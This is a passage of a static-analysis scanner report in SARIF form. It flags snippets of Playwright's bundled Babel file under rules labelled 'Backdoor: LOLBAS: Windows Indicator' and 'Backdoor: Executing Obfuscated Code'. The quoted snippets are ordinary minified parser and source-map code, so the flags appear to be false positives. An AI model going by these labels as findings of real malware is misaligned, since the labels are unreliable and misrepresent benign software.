                      "markdown": "` not have an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAsse`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 4050,
                  "endLine": 23,
                  "endColumn": 4054,
                  "snippet": {
                    "text": "ratorBeforeExport:\"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.\",DecoratorsBeforeAfterExport:\"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.\",DecoratorConstructor:\"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?\",DecoratorExportClass:\"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.\",Deco",
                    "rendered": {
                      "text": "ratorBeforeExport:\"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.\",DecoratorsBeforeAfterExport:\"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.\",DecoratorConstructor:\"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?\",DecoratorExportClass:\"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.\",Deco",
                      "markdown": "`ratorBeforeExport:\"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.\",DecoratorsBeforeAfterExport:\"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.\",DecoratorConstructor:\"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?\",DecoratorExportClass:\"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.\",Deco`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2819,
                  "endLine": 23,
                  "endColumn": 2823,
                  "snippet": {
                    "text": "nside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function arg",
                    "rendered": {
                      "text": "nside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function arg",
                      "markdown": "`nside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function arg`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2713,
                  "endLine": 23,
                  "endColumn": 2717,
                  "snippet": {
                    "text": "tifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'se",
                    "rendered": {
                      "text": "tifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'se",
                      "markdown": "`tifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'se`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2324,
                  "endLine": 23,
                  "endColumn": 2328,
                  "snippet": {
                    "text": "e,prefix:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",",
                    "rendered": {
                      "text": "e,prefix:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",",
                      "markdown": "`e,prefix:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 353,
                  "endLine": 2,
                  "endColumn": 357,
                  "snippet": {
                    "text": "StackTrace:n}=Error,s;if(Error.stackTraceLimit=1+e+t,Error.prepareStackTrace=function(a,o){s=o},new Error().stack,Error.stackTraceLimit=r,Error.prepareStackTrace=n,!s)return{internal:!1,trace:\"\"};let i=s.slice(1+e,1+e+t);return{internal:/[\\\\/]@babel[\\\\/]/.test(i[1].getFileName()),trace:i.map(a=>`    at ${a}`).join(`\n`)}}});var Mt=E(T=>{\"use strict\";Object.defineProperty(T,\"__esModule\",{value:!0});T.isAccessor=Jj;T.isAnyTypeAnnotation=gB;T.isArgumentPlaceholder=GF;T.isArrayExpression=L3;T.isArrayPattern=Fk;T.isArrayTypeAnnotation=bB;T.isArrowFunctionExpression=jk;T.isAssignmentExpression=M3;T.isAss",
                    "rendered": {
                      "text": "StackTrace:n}=Error,s;if(Error.stackTraceLimit=1+e+t,Error.prepareStackTrace=function(a,o){s=o},new Error().stack,Error.stackTraceLimit=r,Error.prepareStackTrace=n,!s)return{internal:!1,trace:\"\"};let i=s.slice(1+e,1+e+t);return{internal:/[\\\\/]@babel[\\\\/]/.test(i[1].getFileName()),trace:i.map(a=>`    at ${a}`).join(`\n`)}}});var Mt=E(T=>{\"use strict\";Object.defineProperty(T,\"__esModule\",{value:!0});T.isAccessor=Jj;T.isAnyTypeAnnotation=gB;T.isArgumentPlaceholder=GF;T.isArrayExpression=L3;T.isArrayPattern=Fk;T.isArrayTypeAnnotation=bB;T.isArrowFunctionExpression=jk;T.isAssignmentExpression=M3;T.isAss",
                      "markdown": "`StackTrace:n}=Error,s;if(Error.stackTraceLimit=1+e+t,Error.prepareStackTrace=function(a,o){s=o},new Error().stack,Error.stackTraceLimit=r,Error.prepareStackTrace=n,!s)return{internal:!1,trace:\"\"};let i=s.slice(1+e,1+e+t);return{internal:/[\\\\/]@babel[\\\\/]/.test(i[1].getFileName()),trace:i.map(a=>`    at ${a}`).join(`\n`)}}});var Mt=E(T=>{\"use strict\";Object.defineProperty(T,\"__esModule\",{value:!0});T.isAccessor=Jj;T.isAnyTypeAnnotation=gB;T.isArgumentPlaceholder=GF;T.isArrayExpression=L3;T.isArrayPattern=Fk;T.isArrayTypeAnnotation=bB;T.isArrowFunctionExpression=jk;T.isAssignmentExpression=M3;T.isAss`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1767,
                  "startColumn": 185,
                  "endLine": 1767,
                  "endColumn": 2923,
                  "snippet": {
                    "text": "mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return typeof e!=\"object\"?e:Kb(e,new Map)}});var aO=E(Jb=>{\"use strict\";Object.defineProperty(Jb,\"__esModule\",{value:!0});Jb.default=fge;function nO(){let e=require(\"fs\");return nO=function(){return e},e}function Xb(){let e=require(\"path\");return Xb=function(){return e},e}function sO(){let e=zs();return sO=function(){return e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);let s=null;if(t.inputSourceMap!==!1){if(typeof t.inputSourceMap==\"object\"&&(s=qf().fromObject(t.inputSourceMap)),!s){let i=rO(cge,n);if(i)try{s=qf().fromComment(\"//\"+i)}catch{Hb(\"discarding unknown inline input sourcemap\")}}if(!s){let i=rO(tO,n);if(typeof t.filename==\"string\"&&i)try{let a=tO.exec(i),o=nO().readFileSync(Xb().resolve(Xb().dirname(t.filename),a[1]),\"utf8\");s=qf().fromJSON(o)}catch(a){Hb(\"discarding unknown file input sourcemap\",a)}else i&&Hb(\"discarding un-loadable file input sourcemap\")}}return new ige.default(t,{code:r,ast:n,inputMap:s})}function Yb(e,t,r){return t&&(t=t.filter(({value:n})=>e.test(n)?(r=n,!1):!0)),[t,r]}function rO(e,t){let r=null;return uge(t,n=>{[n.leadingComments,r]=Yb(e,n.leadingComments,r),[n.innerComments,r]=Yb(e,n.innerComments,r),[n.trailingComments,r]=Yb(e,n.trailingComments,r)}),r}});var oO=E((zb,Qb)=>{(function(e,t){typeof zb==\"object\"&&typeof Qb!=\"undefined\"?Qb.exports=t(gu(),gm()):typeof define==\"function\"&&define.amd?define([\"@jridgewell/trace-mapping\",\"@jridgewell/gen-mapping\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,e.remapping=t(e.traceMapping,e.genMapping))})(zb,function(e,t){\"use strict\";let r=s(\"\",-1,-1,\"\",null),n=[];function s(d,y,v,I,D){return{source:d,line:y,column:v,name:I,content:D}}function i(d,y,v,I){return{map:d,sources:y,source:v,content:I}}function a(d,y){return i(d,y,\"\",null)}function o(d,y){return i(null,n,d,y)}function l(d){let y=new t.GenMapping({file:d.map.file}),{sources:v,map:I}=d,D=I.names,O=e.decodedMappings(I);for(let _=0;_<O.length;_++){let F=O[_];for(let R=0;R<F.length;R++){let K=F[R],te=K[0],se=r;if(K.length!==1){let q=v[K[1]];if(se=u(q,K[2],K[3],K.length===5?D[K[4]]:\"\"),se==null)continue}let{column:Te,line:Pe,name:Be,content:dt,source:j}=se;t.maybeAddSegment(y,_,te,j,Pe,Te,Be),j&&dt!=null",
                    "rendered": {
                      "text": "mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return typeof e!=\"object\"?e:Kb(e,new Map)}});var aO=E(Jb=>{\"use strict\";Object.defineProperty(Jb,\"__esModule\",{value:!0});Jb.default=fge;function nO(){let e=require(\"fs\");return nO=function(){return e},e}function Xb(){let e=require(\"path\");return Xb=function(){return e},e}function sO(){let e=zs();return sO=function(){return e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);let s=null;if(t.inputSourceMap!==!1){if(typeof t.inputSourceMap==\"object\"&&(s=qf().fromObject(t.inputSourceMap)),!s){let i=rO(cge,n);if(i)try{s=qf().fromComment(\"//\"+i)}catch{Hb(\"discarding unknown inline input sourcemap\")}}if(!s){let i=rO(tO,n);if(typeof t.filename==\"string\"&&i)try{let a=tO.exec(i),o=nO().readFileSync(Xb().resolve(Xb().dirname(t.filename),a[1]),\"utf8\");s=qf().fromJSON(o)}catch(a){Hb(\"discarding unknown file input sourcemap\",a)}else i&&Hb(\"discarding un-loadable file input sourcemap\")}}return new ige.default(t,{code:r,ast:n,inputMap:s})}function Yb(e,t,r){return t&&(t=t.filter(({value:n})=>e.test(n)?(r=n,!1):!0)),[t,r]}function rO(e,t){let r=null;return uge(t,n=>{[n.leadingComments,r]=Yb(e,n.leadingComments,r),[n.innerComments,r]=Yb(e,n.innerComments,r),[n.trailingComments,r]=Yb(e,n.trailingComments,r)}),r}});var oO=E((zb,Qb)=>{(function(e,t){typeof zb==\"object\"&&typeof Qb!=\"undefined\"?Qb.exports=t(gu(),gm()):typeof define==\"function\"&&define.amd?define([\"@jridgewell/trace-mapping\",\"@jridgewell/gen-mapping\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,e.remapping=t(e.traceMapping,e.genMapping))})(zb,function(e,t){\"use strict\";let r=s(\"\",-1,-1,\"\",null),n=[];function s(d,y,v,I,D){return{source:d,line:y,column:v,name:I,content:D}}function i(d,y,v,I){return{map:d,sources:y,source:v,content:I}}function a(d,y){return i(d,y,\"\",null)}function o(d,y){return i(null,n,d,y)}function l(d){let y=new t.GenMapping({file:d.map.file}),{sources:v,map:I}=d,D=I.names,O=e.decodedMappings(I);for(let _=0;_<O.length;_++){let F=O[_];for(let R=0;R<F.length;R++){let K=F[R],te=K[0],se=r;if(K.length!==1){let q=v[K[1]];if(se=u(q,K[2],K[3],K.length===5?D[K[4]]:\"\"),se==null)continue}let{column:Te,line:Pe,name:Be,content:dt,source:j}=se;t.maybeAddSegment(y,_,te,j,Pe,Te,Be),j&&dt!=null",
                      "markdown": "`mn:a.column+1}},{highlightCode:r});o?i.message=`${n}: `+(0,rge.default)(o[0],a,l,n):i.message=`${n}: ${i.message}\n\n`+l,i.code=\"BABEL_PARSE_ERROR\"}throw i}}});var eO=E(Gb=>{\"use strict\";Object.defineProperty(Gb,\"__esModule\",{value:!0});Gb.default=sge;function Kb(e,t){if(e!==null){if(t.has(e))return t.get(e);let r;if(Array.isArray(e)){r=new Array(e.length),t.set(e,r);for(let n=0;n<e.length;n++)r[n]=typeof e[n]!=\"object\"?e[n]:Kb(e[n],t)}else{r={},t.set(e,r);let n=Object.keys(e);for(let s=0;s<n.length;s++){let i=n[s];r[i]=typeof e[i]!=\"object\"?e[i]:Kb(e[i],t)}}return r}return e}function sge(e){return typeof e!=\"object\"?e:Kb(e,new Map)}});var aO=E(Jb=>{\"use strict\";Object.defineProperty(Jb,\"__esModule\",{value:!0});Jb.default=fge;function nO(){let e=require(\"fs\");return nO=function(){return e},e}function Xb(){let e=require(\"path\");return Xb=function(){return e},e}function sO(){let e=zs();return sO=function(){return e},e}function iO(){let e=De();return iO=function(){return e},e}function qf(){let e=qb();return qf=function(){return e},e}var ige=_c(),age=Wb(),oge=eO(),{file:lge,traverseFast:uge}=iO(),Hb=sO()(\"babel:transform:file\"),cge=/^[@#]\\s+sourceMappingURL=data:(?:application|text)\\/json;(?:charset[:=]\\S+?;)?base64,(?:.*)$/,tO=/^[@#][ \\t]+sourceMappingURL=([^\\s'\"`]+)[ \\t]*$/;function*fge(e,t,r,n){if(r=`${r||\"\"}`,n){if(n.type===\"Program\")n=lge(n,[],[]);else if(n.type!==\"File\")throw new Error(\"AST root must be a Program or File node\");t.cloneInputAst&&(n=(0,oge.default)(n))}else n=yield*(0,age.default)(e,t,r);let s=null;if(t.inputSourceMap!==!1){if(typeof t.inputSourceMap==\"object\"&&(s=qf().fromObject(t.inputSourceMap)),!s){let i=rO(cge,n);if(i)try{s=qf().fromComment(\"//\"+i)}catch{Hb(\"discarding unknown inline input sourcemap\")}}if(!s){let i=rO(tO,n);if(typeof t.filename==\"string\"&&i)try{let a=tO.exec(i),o=nO().readFileSync(Xb().resolve(Xb().dirname(t.filename),a[1]),\"utf8\");s=qf().fromJSON(o)}catch(a){Hb(\"discarding unknown file input sourcemap\",a)}else i&&Hb(\"discarding un-loadable file input sourcemap\")}}return new ige.default(t,{code:r,ast:n,inputMap:s})}function Yb(e,t,r){return t&&(t=t.filter(({value:n})=>e.test(n)?(r=n,!1):!0)),[t,r]}function rO(e,t){let r=null;return uge(t,n=>{[n.leadingComments,r]=Yb(e,n.leadingComments,r),[n.innerComments,r]=Yb(e,n.innerComments,r),[n.trailingComments,r]=Yb(e,n.trailingComments,r)}),r}});var oO=E((zb,Qb)=>{(function(e,t){typeof zb==\"object\"&&typeof Qb!=\"undefined\"?Qb.exports=t(gu(),gm()):typeof define==\"function\"&&define.amd?define([\"@jridgewell/trace-mapping\",\"@jridgewell/gen-mapping\"],t):(e=typeof globalThis!=\"undefined\"?globalThis:e||self,e.remapping=t(e.traceMapping,e.genMapping))})(zb,function(e,t){\"use strict\";let r=s(\"\",-1,-1,\"\",null),n=[];function s(d,y,v,I,D){return{source:d,line:y,column:v,name:I,content:D}}function i(d,y,v,I){return{map:d,sources:y,source:v,content:I}}function a(d,y){return i(d,y,\"\",null)}function o(d,y){return i(null,n,d,y)}function l(d){let y=new t.GenMapping({file:d.map.file}),{sources:v,map:I}=d,D=I.names,O=e.decodedMappings(I);for(let _=0;_<O.length;_++){let F=O[_];for(let R=0;R<F.length;R++){let K=F[R],te=K[0],se=r;if(K.length!==1){let q=v[K[1]];if(se=u(q,K[2],K[3],K.length===5?D[K[4]]:\"\"),se==null)continue}let{column:Te,line:Pe,name:Be,content:dt,source:j}=se;t.maybeAddSegment(y,_,te,j,Pe,Te,Be),j&&dt!=null`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1750,
                  "startColumn": 2530,
                  "endLine": 1750,
                  "endColumn": 5470,
                  "snippet": {
                    "text": "!0});Lf.default=void 0;var pl=class{constructor(t,r,n){this._map=new Map,this.key=void 0,this.file=void 0,this.opts=void 0,this.cwd=void 0,this.filename=void 0,this.key=r,this.file=t,this.opts=n||{},this.cwd=t.opts.cwd,this.filename=t.opts.filename}set(t,r){this._map.set(t,r)}get(t){return this._map.get(t)}availableHelper(t,r){return this.file.availableHelper(t,r)}addHelper(t){return this.file.addHelper(t)}buildCodeFrameError(t,r,n){return this.file.buildCodeFrameError(t,r,n)}};Lf.default=pl;pl.prototype.getModuleName=function(){return this.file.getModuleName()},pl.prototype.addImport=function(){this.file.addImport()}});var YI=E(Lb=>{\"use strict\";Object.defineProperty(Lb,\"__esModule\",{value:!0});Lb.default=W0e;function GI(){let e=Xr();return GI=function(){return e},e}var $0e=zc(),jb,WI={name:\"internal.blockHoist\",visitor:{Block:{exit({node:e}){e.body=KI(e.body)}},SwitchCase:{exit({node:e}){e.consequent=KI(e.consequent)}}}};function KI(e){let t=Math.pow(2,30)-1,r=!1;for(let n=0;n<e.length;n++){let s=e[n],i=HI(s);if(i>t){r=!0;break}t=i}return r?K0e(e.slice()):e}function W0e(){return jb||(jb=new $0e.default(Object.assign({},WI,{visitor:GI().default.explode(WI.visitor)}),{})),jb}function HI(e){let t=e==null?void 0:e._blockHoist;return t==null?1:t===!0?2:t}function K0e(e){let t=Object.create(null);for(let s=0;s<e.length;s++){let i=e[s],a=HI(i);(t[a]||(t[a]=[])).push(i)}let r=Object.keys(t).map(s=>+s).sort((s,i)=>i-s),n=0;for(let s of r){let i=t[s];for(let a of i)e[n++]=a}return e}});var Rb=E(Mb=>{\"use strict\";Object.defineProperty(Mb,\"__esModule\",{value:!0});Mb.default=G0e;function Mf(){let e=require(\"path\");return Mf=function(){return e},e}function G0e(e){let{filename:t,cwd:r,filenameRelative:n=typeof t==\"string\"?Mf().relative(r,t):\"unknown\",sourceType:s=\"module\",inputSourceMap:i,sourceMaps:a=!!i,sourceRoot:o=e.options.moduleRoot,sourceFileName:l=Mf().basename(n),comments:u=!0,compact:c=\"auto\"}=e.options,f=e.options,p=Object.assign({},f,{parserOpts:Object.assign({sourceType:Mf().extname(n)===\".mjs\"?\"module\":s,sourceFileName:t,plugins:[]},f.parserOpts),generatorOpts:Object.assign({filename:t,auxiliaryCommentBefore:f.auxiliaryCommentBefore,auxiliaryCommentAfter:f.auxiliaryCommentAfter,retainLines:f.retainLines,comments:u,shouldPrintComment:f.shouldPrintComment,compact:c,minified:f.minified,sourceMaps:a,sourceRoot:o,sourceFileName:l},f.generatorOpts)});for(let m of e.passes)for(let b of m)b.manipulateOptions&&b.manipulateOptions(p,p.parserOpts);return p}});var qb=E(Lt=>{\"use strict\";Object.defineProperty(Lt,\"commentRegex\",{get:function(){return/^\\s*?\\/[\\/\\*][@#]\\s+?sourceMappingURL=data:(((?:application|text)\\/json)(?:;charset=([^;,]+?)?)?)?(?:;(base64))?,(.*?)$/mg}});Object.defineProperty(Lt,\"mapFileCommentRegex\",{get:function(){return/(?:\\/\\/[@#][ \\t]+?sourceMappingURL=([^\\s'\"`]+?)[ \\t]*?$)|(?:\\/\\*[@#][ \\t]+sourceMappingURL=([^*]+?)[ \\t]*?(?:\\*\\/){1}[ \\t]*?$)/mg}});var Rf;typeof Buffer!=\"undefined\"?typeof Buffer.from==\"function\"?Rf=H0e:Rf=Y0e:Rf=X0e;function H0e(e){return Buffer.from(e,\"base64\").toString()}function Y0e(e){if(typeof value==\"number\")throw new TypeError(\"The value to decode must not be of type number.\");return new Buffer(e,\"base64\").toString()}function X0e(e){return decodeURIComponent(escape(atob(e)))}function J0e(e){return e.split(\",\").pop()}function z0e(e,t){var r=Lt.mapFileCommentRegex.exec(e),n=r[1]||r[2];try{var e=t(n);return e!=null&&typeof e.catch==\"function\"?e.catch(s):e}catch(i){s(i)}function s(i){throw new Error(\"An error occurred while trying to read the m",
                    "rendered": {
